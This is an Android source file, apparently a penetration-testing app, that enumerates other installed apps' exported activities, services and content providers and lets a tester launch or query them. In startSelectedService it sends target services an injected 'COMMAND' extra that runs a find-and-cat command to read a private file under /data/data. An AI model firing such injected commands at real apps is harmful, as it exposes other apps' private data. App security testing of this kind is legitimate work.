package com.ptandroid;

import android.app.AlertDialog;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.ComponentName;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.ActivityInfo;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.pm.ProviderInfo;
import android.content.pm.ResolveInfo;
import android.content.pm.ServiceInfo;
import android.database.Cursor;

import androidx.biometric.BiometricPrompt;

import android.net.Uri;
import android.os.Bundle;
import android.text.InputType;
import android.text.TextUtils;
import android.view.View;
import android.view.Menu;
import android.widget.Button;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Toast;

import com.google.android.material.snackbar.Snackbar;
import com.google.android.material.navigation.NavigationView;

import androidx.annotation.NonNull;
import androidx.core.app.NotificationCompat;
import androidx.core.app.NotificationManagerCompat;
import androidx.core.content.ContextCompat;
import androidx.navigation.NavController;
import androidx.navigation.Navigation;
import androidx.navigation.ui.AppBarConfiguration;
import androidx.navigation.ui.NavigationUI;
import androidx.drawerlayout.widget.DrawerLayout;
import androidx.appcompat.app.AppCompatActivity;

import com.ptandroid.databinding.ActivityMainBinding;
import com.ptandroid.ui.logs.LogsFragment;

import androidx.fragment.app.FragmentManager;

import java.io.File;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Iterator;
import java.util.List;
import java.util.Map;
import java.util.Set;

public class MainActivity extends AppCompatActivity {
    Button updatePackageButton, openActivityButton, stopServiceButton, startServiceButton, contentProviderButton, sendIntentButton, testNotificationButton, biometricButton;
    TextView currentPackageTextView;
    private AppBarConfiguration mAppBarConfiguration;
    private ActivityMainBinding binding;
    private static final int NOTIFICATION_PERMISSION_REQUEST_CODE = 1001;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        binding = ActivityMainBinding.inflate(getLayoutInflater());
        setContentView(binding.getRoot());
// check if the app has notification permission
        NotificationManagerCompat notificationManager = NotificationManagerCompat.from(this);
        boolean hasNotificationAccess = notificationManager.areNotificationsEnabled();
// Initialize buttons
        openActivityButton = findViewById(R.id.Open_Activity);
        stopServiceButton = findViewById(R.id.Stop_service);
        startServiceButton = findViewById(R.id.Start_service);
        contentProviderButton = findViewById(R.id.Contet_provider);
        sendIntentButton = findViewById(R.id.Send_intent);
        testNotificationButton = findViewById(R.id.Test_notification);
        biometricButton = findViewById(R.id.biometric_button);
        updatePackageButton = findViewById(R.id.update_package_button);
        currentPackageTextView = findViewById(R.id.current_package_textview);

        // Get the initial fragment (Actions Fragment)


        // Check if notification permission is granted


        binding.appBarMain.OpenActivity.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {

                SharedPreferences preferences = getSharedPreferences("package_prefs", MODE_PRIVATE);
                String userEnteredPackage = preferences.getString("userPackage", "");

                // Retrieve the exported activities associated with the package
                Set<String> exportedActivities = preferences.getStringSet(userEnteredPackage, new HashSet<>());

                // Convert the set to an array for the AlertDialog
                final String[] activitiesArray = exportedActivities.toArray(new String[0]);

                if (activitiesArray.length > 0) {
                    // Display a list of exported activities to the user
                    AlertDialog.Builder builder = new AlertDialog.Builder(MainActivity.this);
                    builder.setTitle("Choose an exported activity to open");
                    builder.setItems(activitiesArray, new DialogInterface.OnClickListener() {
                        @Override
                        public void onClick(DialogInterface dialog, int which) {
                            // User clicked on an activity, open the selected activity
                            openSelectedActivity(userEnteredPackage, activitiesArray[which]);
                        }
                    });
                    builder.show();
                } else {
                    Snackbar.make(view, "No exported activities found for the selected package", Snackbar.LENGTH_LONG).show();
                }
            }
        });

        binding.appBarMain.SendIntent.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                String packageName = getUserPackageFromPrefs();

                if (hasExportedActivities(packageName)) {
                    // Get the list of exported activities
                    Set<String> exportedActivities = getExportedActivities(packageName);

                    if (exportedActivities != null && !exportedActivities.isEmpty()) {
                        // Convert the set to an array for AlertDialog
                        final String[] activityArray = exportedActivities.toArray(new String[0]);

                        // Build an AlertDialog to let the user choose an activity
                        AlertDialog.Builder builder = new AlertDialog.Builder(MainActivity.this);
                        builder.setTitle("Choose an exported activity");
                        builder.setItems(activityArray, new DialogInterface.OnClickListener() {
                            @Override
                            public void onClick(DialogInterface dialog, int which) {
                                String selectedActivity = activityArray[which];

                                // Assuming you have the selected activity name, replace "ActivityName" with the actual name.
                                List<String> actions = getActivityActions(packageName, selectedActivity);
                                List<String> categories = getActivityCategories(packageName, selectedActivity);
                                collectExtras(new ExtrasCallback() {
                                    @Override
                                    public void onExtrasCollected(Map<String, String> extrasMap) {
                                        // Call startFinalIntent with the gathered data
                                        startFinalIntent(packageName, selectedActivity, actions, categories, extrasMap);
                                    }
                                });

                            }
                        });

                        builder.show();
                    } else {
                        // No exported activities
                        // You might want to handle this case, for example, by showing a message to the user.
                        showSnackbar("There is no exported activities found for this package.");
                    }
                } else {
                    // Do nothing if there are no exported activities
                    showSnackbar("There is no exported activities found for this package.");
                }
            }
        });


        binding.appBarMain.StartService.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {

                // Retrieve the saved user-entered package
                SharedPreferences preferences = getSharedPreferences("package_prefs", MODE_PRIVATE);
                String userEnteredPackage = preferences.getString("userPackage", "");

                // Retrieve the exported services associated with the package
                Set<String> exportedServices = preferences.getStringSet(userEnteredPackage + "_services", new HashSet<>());

                // Convert the set to an array for the AlertDialog
                final String[] servicesArray = exportedServices.toArray(new String[0]);

                if (servicesArray.length > 0) {
                    // Display a list of exported services to the user
                    AlertDialog.Builder builder = new AlertDialog.Builder(MainActivity.this);
                    builder.setTitle("Choose an exported service to start");
                    builder.setItems(servicesArray, new DialogInterface.OnClickListener() {
                        @Override
                        public void onClick(DialogInterface dialog, int which) {
                            // User clicked on a service, start the selected service
                            startSelectedService(userEnteredPackage, servicesArray[which]);
                        }
                    });
                    builder.show();
                } else {
                    Snackbar.make(view, "No exported services found for the selected package", Snackbar.LENGTH_LONG).show();
                }
            }

        });

        binding.appBarMain.StopService.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                // Retrieve the saved user-entered package
                SharedPreferences preferences = getSharedPreferences("package_prefs", MODE_PRIVATE);
                String userEnteredPackage = preferences.getString("userPackage", "");

                // Retrieve the exported services associated with the package
                Set<String> exportedServices = preferences.getStringSet(userEnteredPackage + "_services", new HashSet<>());

                // Convert the set to an array for the AlertDialog
                final String[] servicesArray = exportedServices.toArray(new String[0]);

                if (servicesArray.length > 0) {
                    // Display a list of exported services to the user
                    AlertDialog.Builder builder = new AlertDialog.Builder(MainActivity.this);
                    builder.setTitle("Choose an exported service to stop");
                    builder.setItems(servicesArray, new DialogInterface.OnClickListener() {
                        @Override
                        public void onClick(DialogInterface dialog, int which) {
                            // User clicked on a service, start the selected service
                            stopSelectedService(userEnteredPackage, servicesArray[which]);
                        }
                    });
                    builder.show();
                } else {
                    Snackbar.make(view, "No exported services found for the selected package", Snackbar.LENGTH_LONG).show();
                }

            }
        });

        binding.appBarMain.ContetProvider.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                // Retrieve the saved user-entered package
                SharedPreferences preferences = getSharedPreferences("package_prefs", MODE_PRIVATE);
                String userEnteredPackage = preferences.getString("userPackage", "");

                // Retrieve the exported content providers associated with the package
                Set<String> exportedProviders = preferences.getStringSet(userEnteredPackage + "_providers", new HashSet<>());

                // Convert the set to an array for the AlertDialog
                final String[] providersArray = exportedProviders.toArray(new String[0]);

                if (providersArray.length > 0) {
                    // Display a list of exported content providers to the user
                    AlertDialog.Builder builder = new AlertDialog.Builder(MainActivity.this);
                    builder.setTitle("Choose an exported content provider");

                    builder.setItems(providersArray, new DialogInterface.OnClickListener() {
                        @Override
                        public void onClick(DialogInterface dialog, int which) {
                            // User clicked on a content provider, prompt for the content provider URI
                            showContentProviderUriDialog(userEnteredPackage, providersArray[which]);
                        }
                    });

                    builder.show();
                } else {
                    Snackbar.make(view, "No exported content providers found for the selected package", Snackbar.LENGTH_LONG).show();
                }
            }

        });

        binding.appBarMain.TestNotification.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                if (!hasNotificationAccess) {
                    // If not granted, request the permission
                    showSnackbar("Notifications are not enabled for this app. Please enable notifications for this app in device settings.");
                    requestNotificationPermission();
                    return;
                } else {
                    showSnackbar("Notifications Enabled.");
                }
                // Create an intent for the notification
                Intent intent = new Intent(getApplicationContext(), MainActivity.class);
                intent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
                PendingIntent pendingIntent = PendingIntent.getActivity(getApplicationContext(), 0, intent, PendingIntent.FLAG_ONE_SHOT | PendingIntent.FLAG_IMMUTABLE);

                // Create a notification
                NotificationCompat.Builder notificationBuilder = new NotificationCompat.Builder(getApplicationContext(), "channel_id").setSmallIcon(R.drawable.hacker).setContentTitle("Notification Title").setContentText("Notification Text").setAutoCancel(true).setContentIntent(pendingIntent);

                // Get the NotificationManager
                NotificationManager notificationManager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);

                String channelId = "454545";
                CharSequence channelName = "PT Malware";
                int importance = NotificationManager.IMPORTANCE_DEFAULT;
                NotificationChannel notificationChannel = new NotificationChannel(channelId, channelName, importance);
                notificationManager.createNotificationChannel(notificationChannel);
                notificationBuilder.setChannelId(channelId);

                // Display the notification
                notificationManager.notify(0, notificationBuilder.build());

                // Show a Snackbar
            }
        });

        binding.appBarMain.biometricButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                // Create a BiometricPrompt instance
                BiometricPrompt.PromptInfo promptInfo = new BiometricPrompt.PromptInfo.Builder().setTitle("Biometric Authentication").setSubtitle("Authenticate using your biometric credential").setNegativeButtonText("Cancel").build();

                BiometricPrompt biometricPrompt = new BiometricPrompt(MainActivity.this, // Pass your activity instance
                        ContextCompat.getMainExecutor(MainActivity.this), new BiometricPrompt.AuthenticationCallback() {
                    @Override
                    public void onAuthenticationError(int errorCode, CharSequence errString) {
                        super.onAuthenticationError(errorCode, errString);
                        // Handle authentication error
                        Snackbar.make(view, "Authentication error: " + errString, Snackbar.LENGTH_SHORT).show();
                    }

                    @Override
                    public void onAuthenticationSucceeded(BiometricPrompt.AuthenticationResult result) {
                        super.onAuthenticationSucceeded(result);
                        // Authentication succeeded, proceed with your logic
                        Snackbar.make(view, "Authentication succeeded", Snackbar.LENGTH_SHORT).show();
                        // Add your logic after successful authentication
                    }

                    @Override
                    public void onAuthenticationFailed() {
                        super.onAuthenticationFailed();
                        // Handle authentication failure
                        Snackbar.make(view, "Authentication failed", Snackbar.LENGTH_SHORT).show();
                    }
                });

                // Show the biometric prompt
                biometricPrompt.authenticate(promptInfo);
            }
        });

        binding.appBarMain.updatePackageButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                chooseAppFromList();
            }
        });


        setSupportActionBar(binding.appBarMain.toolbar);
        DrawerLayout drawer = binding.drawerLayout;
        NavigationView navigationView = binding.navView;
        // Passing each menu ID as a set of Ids because each
        // menu should be considered as top level destinations.
        mAppBarConfiguration = new AppBarConfiguration.Builder(R.id.nav_actions, R.id.nav_search, R.id.nav_logs).setOpenableLayout(drawer).build();

        NavController navController = Navigation.findNavController(this, R.id.nav_host_fragment_content_main);
        NavigationUI.setupActionBarWithNavController(this, navController, mAppBarConfiguration);
        NavigationUI.setupWithNavController(navigationView, navController);

        // Add a destination changed listener to handle button visibility
        navController.addOnDestinationChangedListener((controller, destination, arguments) -> {
            if (destination.getId() == R.id.nav_actions) {
                // If the current fragment is ActionsFragment, show the buttons
                showButtons();
            } else {
                // Hide the buttons for other fragments
                hideButtons();
            }
        });


        LogsFragment logsFragment = getLogsFragment();
        if (!hasNotificationAccess) {
            // If not granted, request the permission
            showSnackbar("Notifications are not enabled for this app. Please enable notifications for this app in device settings.");
            requestNotificationPermission();
        }

        // Use logsFragment to append logs or perform other actions
        if (logsFragment != null) {
            logsFragment.appendToLogs("This is a log message from MainActivity");
            // You can also clear logs if needed
            // logsFragment.clearLogsConsole();
        }

        if (!sharedPreferencesFileExists()) {
            chooseAppFromList();
        } else {
            String currentApp = getUserPackageFromPrefs();
            updateCurrentApp(currentApp);
        }


    }

    private void updateCurrentApp(String userPackage) {
        String text = "Current Package: " + userPackage;
        binding.appBarMain.currentPackageTextview.setText(text);
    }

    private LogsFragment getLogsFragment() {
        FragmentManager fragmentManager = getSupportFragmentManager();
        return (LogsFragment) fragmentManager.findFragmentById(R.id.logs_activity);
    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        // Inflate the menu; this adds items to the action bar if it is present.
        getMenuInflater().inflate(R.menu.main, menu);
        return true;
    }

    @Override
    public boolean onSupportNavigateUp() {
        NavController navController = Navigation.findNavController(this, R.id.nav_host_fragment_content_main);
        return NavigationUI.navigateUp(navController, mAppBarConfiguration) || super.onSupportNavigateUp();
    }


    @Override
    protected void onResume() {
        super.onResume();

        if (!hasNotificationAccess()) {
            // Permission is not granted, show the permission dialog
            requestNotificationPermission();
        } else {
        }
    }

    private boolean hasNotificationAccess() {
        NotificationManagerCompat notificationManager = NotificationManagerCompat.from(this);
        return notificationManager.areNotificationsEnabled();
    }

    private void requestNotificationPermission() {
        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setTitle("Enable Notification Access");
        builder.setMessage("Please grant notification access for this app");

// Add positive button to navigate to notification settings when clicked
        builder.setPositiveButton("Open Settings", new DialogInterface.OnClickListener() {
            @Override
            public void onClick(DialogInterface dialog, int which) {
                // Open the app's notification settings using an Intent
                Intent intent = new Intent();
                intent.setAction("android.settings.APP_NOTIFICATION_SETTINGS");
                intent.putExtra("android.provider.extra.APP_PACKAGE", getPackageName());
                startActivity(intent);
            }
        });

// Add negative button to cancel the dialog
        builder.setNegativeButton("Cancel", new DialogInterface.OnClickListener() {
            @Override
            public void onClick(DialogInterface dialog, int which) {
                // User declined to open settings, handle it here if needed
                showSnackbar("Notification permission denied");
                dialog.dismiss();
            }
        });

// Show the AlertDialog
        AlertDialog dialog = builder.create();
        dialog.show();
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == NOTIFICATION_PERMISSION_REQUEST_CODE) {
            // Check if the permission is granted
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                showSnackbar("Notification permission granted");
            } else {
                showSnackbar("Notification permission denied");
            }
        }
    }

    private void showSnackbar(String message) {
        Snackbar.make(findViewById(android.R.id.content), message, Snackbar.LENGTH_SHORT).show();
    }


    // Method to show buttons
    private void showButtons() {
        openActivityButton.setVisibility(View.VISIBLE);
        stopServiceButton.setVisibility(View.VISIBLE);
        startServiceButton.setVisibility(View.VISIBLE);
        contentProviderButton.setVisibility(View.VISIBLE);
        sendIntentButton.setVisibility(View.VISIBLE);
        testNotificationButton.setVisibility(View.VISIBLE);
        biometricButton.setVisibility(View.VISIBLE);
        updatePackageButton.setVisibility(View.VISIBLE);
        currentPackageTextView.setVisibility(View.VISIBLE);
    }

    // Method to hide buttons
    private void hideButtons() {
        openActivityButton.setVisibility(View.GONE);
        stopServiceButton.setVisibility(View.GONE);
        startServiceButton.setVisibility(View.GONE);
        contentProviderButton.setVisibility(View.GONE);
        sendIntentButton.setVisibility(View.GONE);
        testNotificationButton.setVisibility(View.GONE);
        biometricButton.setVisibility(View.GONE);
        updatePackageButton.setVisibility(View.GONE);
        currentPackageTextView.setVisibility(View.GONE);

    }


    private void chooseAppFromList() {
        PackageManager pm = getPackageManager();
        List<ApplicationInfo> packages = pm.getInstalledApplications(PackageManager.GET_META_DATA);

        List<String> packageNames = new ArrayList<>();

        // Sort the list of applications by name
        packages.sort(new ApplicationInfo.DisplayNameComparator(pm));

        for (ApplicationInfo packageInfo : packages) {
            if (!isSystemPackage(packageInfo)) {
                packageNames.add(packageInfo.packageName);
            }
        }

        final CharSequence[] items = packageNames.toArray(new CharSequence[packageNames.size()]);

        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setTitle("Choose an app");
        builder.setItems(items, new DialogInterface.OnClickListener() {
            public void onClick(DialogInterface dialog, int item) {
                // User clicked on an app, do something with the selected app
                String selectedPackageName = packageNames.get(item);
                // Now you can use the selectedPackageName as needed
                Snackbar.make(binding.getRoot(), "Selected Package: " + selectedPackageName, Snackbar.LENGTH_LONG).show();
                saveUserEnteredPackage(selectedPackageName);
            }
        });
        AlertDialog alert = builder.create();
        alert.show();
    }

    private boolean isSystemPackage(ApplicationInfo appInfo) {
        return (appInfo.flags & ApplicationInfo.FLAG_SYSTEM) != 0;
    }


    // Method to save the entered package to SharedPreferences
    private void saveUserEnteredPackage(String userPackage) {
        SharedPreferences preferences = getSharedPreferences("package_prefs", MODE_PRIVATE);
        SharedPreferences.Editor editor = preferences.edit();
        editor.putString("userPackage", userPackage);
        editor.apply();
        saveExportedComponentsToPrefs(userPackage);
        updateCurrentApp(userPackage);
    }

    // Method to retrieve the saved package from SharedPreferences
    private String getUserPackageFromPrefs() {
        SharedPreferences preferences = getSharedPreferences("package_prefs", MODE_PRIVATE);
        return preferences.getString("userPackage", "");
    }


    private boolean sharedPreferencesFileExists() {
        try {
            File sharedPrefsFile = new File(getApplicationInfo().dataDir + "/shared_prefs/" + "package_prefs.xml");
            return sharedPrefsFile.exists();
        } catch (Exception e) {
            return false;
        }
    }


    private void saveExportedComponentsToPrefs(String packageName) {
        try {
            PackageInfo packageInfo = getPackageManager().getPackageInfo(packageName, PackageManager.GET_ACTIVITIES | PackageManager.GET_RECEIVERS | PackageManager.GET_SERVICES | PackageManager.GET_PROVIDERS);

            SharedPreferences prefs = getSharedPreferences("package_prefs", Context.MODE_PRIVATE);
            SharedPreferences.Editor editor = prefs.edit();

            // Save exported activities
            if (packageInfo.activities != null) {
                List<String> exportedActivities = new ArrayList<>();
                for (ActivityInfo activityInfo : packageInfo.activities) {
                    if (activityInfo.exported) {
                        exportedActivities.add(activityInfo.name);
                    }
                }
                editor.putStringSet(packageName + "_activities", new HashSet<>(exportedActivities));
            }

            // Save exported receivers
            if (packageInfo.receivers != null) {
                List<String> exportedReceivers = new ArrayList<>();
                for (ActivityInfo receiverInfo : packageInfo.receivers) {
                    if (receiverInfo.exported) {
                        exportedReceivers.add(receiverInfo.name);
                    }
                }
                editor.putStringSet(packageName + "_receivers", new HashSet<>(exportedReceivers));
            }

            // Save exported services
            if (packageInfo.services != null) {
                List<String> exportedServices = new ArrayList<>();
                for (ServiceInfo serviceInfo : packageInfo.services) {
                    if (serviceInfo.exported) {
                        exportedServices.add(serviceInfo.name);
                    }
                }
                editor.putStringSet(packageName + "_services", new HashSet<>(exportedServices));
            }

            // Save exported content providers
            if (packageInfo.providers != null) {
                List<String> exportedProviders = new ArrayList<>();
                for (ProviderInfo providerInfo : packageInfo.providers) {
                    if (providerInfo.exported) {
                        exportedProviders.add(providerInfo.name);
                    }
                }
                editor.putStringSet(packageName + "_providers", new HashSet<>(exportedProviders));
            }

            editor.apply();
        } catch (PackageManager.NameNotFoundException e) {
            e.printStackTrace();
        }
    }

    private void openSelectedActivity(String packageName, String activityName) {
        try {
            Intent intent = new Intent();
            intent.setClassName(packageName, activityName);
            if (intent.resolveActivity(getPackageManager()) != null) {
                startActivity(intent);
            } else {
                Snackbar.make(binding.getRoot(), "Selected activity not found or cannot be opened", Snackbar.LENGTH_LONG).show();
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void startSelectedService(String packageName, String serviceName) {
        Intent serviceIntent = new Intent();
        serviceIntent.setComponent(new ComponentName(packageName, serviceName));

        // Replace "command" with any additional data you want to pass to the service
        serviceIntent.putExtra("COMMAND", "find /data/data/" + packageName + " -name private.txt -exec cat {} \\;");

        // Start the selected service
        startService(serviceIntent);
    }

    private void stopSelectedService(String packageName, String serviceName) {
        Intent serviceIntent = new Intent();
        serviceIntent.setComponent(new ComponentName(packageName, serviceName));

        // Stop the selected service
        stopService(serviceIntent);

        Snackbar.make(binding.getRoot(), "Stopped Service: " + serviceName, Snackbar.LENGTH_LONG).show();
    }

    private void showContentProviderUriDialog(String userEnteredPackage, String selectedProvider) {
        // Prompt the user to input the content provider URI
        AlertDialog.Builder uriBuilder = new AlertDialog.Builder(MainActivity.this);
        uriBuilder.setTitle("Enter Content Provider URI");

        final EditText inputUri = new EditText(MainActivity.this);
        inputUri.setInputType(InputType.TYPE_CLASS_TEXT);
        inputUri.setText("content://" + selectedProvider); // Initial URI with scheme
        uriBuilder.setView(inputUri);

        uriBuilder.setPositiveButton("OK", new DialogInterface.OnClickListener() {
            @Override
            public void onClick(DialogInterface dialog, int which) {
                // Get the content provider URI entered by the user
                String contentProviderUri = inputUri.getText().toString();

                // Execute the content provider query
                String queryResult = executeContentProviderQuery(userEnteredPackage, contentProviderUri);

                // Display the result in a Snackbar with no line limit
                showSnackbar(queryResult);
            }
        });

        uriBuilder.setNegativeButton("Cancel", new DialogInterface.OnClickListener() {
            @Override
            public void onClick(DialogInterface dialog, int which) {
                dialog.cancel();
            }
        });

        uriBuilder.show();
    }

    private String executeContentProviderQuery(String packageName, String contentProviderUri) {
        Uri contentUri = Uri.parse(contentProviderUri);

        // Create a cursor to query the content provider
        Cursor cursor = getContentResolver().query(contentUri, null, null, null, null);

        if (cursor != null) {
            if (cursor.moveToFirst()) {
                do {
                    // Retrieve data from the cursor
                    String columnName = cursor.getColumnName(1); // Replace index with the column index
                    String columnValue = cursor.getString(1); // Replace index with the column index

                    // Process and display the retrieved data (e.g., log or show in a TextView)
                    showSnackbar(columnName + ": " + columnValue);
                } while (cursor.moveToNext());
            }
            cursor.close();
        } else {
            // Handle case where query failed
            showSnackbar("Query failed");
        }
        return "Query result for URI: " + contentProviderUri;
    }

    private boolean hasExportedActivities(String packageName) {
        Set<String> exportedActivities = getExportedActivities(packageName);
        return exportedActivities != null && !exportedActivities.isEmpty();
    }

    private Set<String> getExportedActivities(String packageName) {
        SharedPreferences prefs = getSharedPreferences("package_prefs", Context.MODE_PRIVATE);
        return prefs.getStringSet(packageName + "_activities", null);
    }

    private List<String> getActivityActions(String packageName, String activityName) {
        List<String> actions = new ArrayList<>();
        PackageManager packageManager = getPackageManager();

        try {
            // Get the package info for the specified package
            PackageInfo packageInfo = packageManager.getPackageInfo(packageName, PackageManager.GET_ACTIVITIES);

            // Check if the package has activities
            if (packageInfo.activities != null) {
                for (ActivityInfo activityInfo : packageInfo.activities) {
                    // Check if the activity name matches the specified activity
                    if (activityInfo.name.equals(activityName)) {
                        // Retrieve the actions associated with the activity
                        if (activityInfo.metaData != null && activityInfo.metaData.containsKey("android.app.action")) {
                            String action = activityInfo.metaData.getString("android.app.action");
                            actions.add(action);
                        }
                    }
                }
            }
        } catch (PackageManager.NameNotFoundException e) {
            e.printStackTrace();
        }

        return actions;
    }


    private List<String> getActivityCategories(String packageName, String activityName) {
        List<String> categories = new ArrayList<>();

        Intent queryIntent = new Intent();
        queryIntent.setComponent(new ComponentName(packageName, activityName));

        PackageManager pm = getPackageManager();
        List<ResolveInfo> resolveInfoList = pm.queryIntentActivityOptions(null, null, queryIntent, 0);

        for (ResolveInfo resolveInfo : resolveInfoList) {
            // Check if the resolved activity has categories
            if (resolveInfo.filter != null && resolveInfo.filter.hasCategory(Intent.CATEGORY_DEFAULT)) {
                Iterator<String> categoryIterator = resolveInfo.filter.categoriesIterator();
                while (categoryIterator.hasNext()) {
                    String category = categoryIterator.next();
                    if (!categories.contains(category)) {
                        categories.add(category);
                    }
                }
            }
        }

        return categories;
    }


    public interface ExtrasCallback {
        void onExtrasCollected(Map<String, String> extrasMap);
    }

    private void collectExtras(final ExtrasCallback callback) {
        Map<String, String> extrasMap = new HashMap<>();
        final int[] extraCount = {1};

        AlertDialog.Builder builder = new AlertDialog.Builder(MainActivity.this);
        builder.setTitle("Enter Extra " + extraCount[0]);

        // Inflate a layout for the dialog
        View dialogLayout = getLayoutInflater().inflate(R.layout.dialog_add_extra, null);
        builder.setView(dialogLayout);

        // Reference the EditTexts in your dialog layout
        EditText etExtraName = dialogLayout.findViewById(R.id.etExtraName);
        EditText etExtraValue = dialogLayout.findViewById(R.id.etExtraValue);

        builder.setPositiveButton("Add", new DialogInterface.OnClickListener() {
            @Override
            public void onClick(DialogInterface dialog, int which) {
                String extraName = etExtraName.getText().toString().trim();
                String extraValue = etExtraValue.getText().toString().trim();

                if (!extraName.isEmpty() && !extraValue.isEmpty()) {
                    extrasMap.put(extraName, extraValue);
                    extraCount[0]++;

                    // Create a new dialog for the next extra
                    AlertDialog nextDialog = createDialog(extraCount[0], extrasMap, callback);
                    nextDialog.show();
                }
            }
        });

        builder.setNegativeButton("Done", new DialogInterface.OnClickListener() {
            @Override
            public void onClick(DialogInterface dialog, int which) {
                // Done button clicked, invoke the callback with the collected extras
                callback.onExtrasCollected(extrasMap);
            }
        });

        builder.show();
    }


    private AlertDialog createDialog(int extraCount, final Map<String, String> extrasMap, final ExtrasCallback callback) {
        AlertDialog.Builder builder = new AlertDialog.Builder(MainActivity.this);
        builder.setTitle("Enter Extra " + extraCount);

        // Inflate a layout for the dialog
        View dialogLayout = getLayoutInflater().inflate(R.layout.dialog_add_extra, null);
        builder.setView(dialogLayout);

        // Reference the EditTexts in your dialog layout
        EditText etExtraName = dialogLayout.findViewById(R.id.etExtraName);
        EditText etExtraValue = dialogLayout.findViewById(R.id.etExtraValue);

        builder.setPositiveButton("Add", new DialogInterface.OnClickListener() {
            @Override
            public void onClick(DialogInterface dialog, int which) {
                // Handle the click event in the initial dialog
            }
        });

        builder.setNegativeButton("Done", new DialogInterface.OnClickListener() {
            @Override
            public void onClick(DialogInterface dialog, int which) {
                // Handle the click event in the initial dialog
                callback.onExtrasCollected(extrasMap);
            }
        });

        return builder.create();
    }

    private void startFinalIntent(String packageName, String activityName, List<String> actions, List<String> categories, Map<String, String> extras) {
        // Get the target package from preferences
        String targetPackage = getUserPackageFromPrefs();

        // Create an Intent with the target package and the selected activity
        Intent intent = new Intent();
        intent.setClassName(targetPackage, activityName);

        // Add actions to the intent
        if (actions != null && !actions.isEmpty()) {
            for (String action : actions) {
                intent.setAction(action);
            }
        }

        // Add categories to the intent
        if (categories != null && !categories.isEmpty()) {
            for (String category : categories) {
                intent.addCategory(category);
            }
        }

        // Add extras to the intent
        if (extras != null && !extras.isEmpty()) {
            for (Map.Entry<String, String> entry : extras.entrySet()) {
                intent.putExtra(entry.getKey(), entry.getValue());
            }
        }

        // Start the activity using the created intent
        startActivity(intent);
    }


}
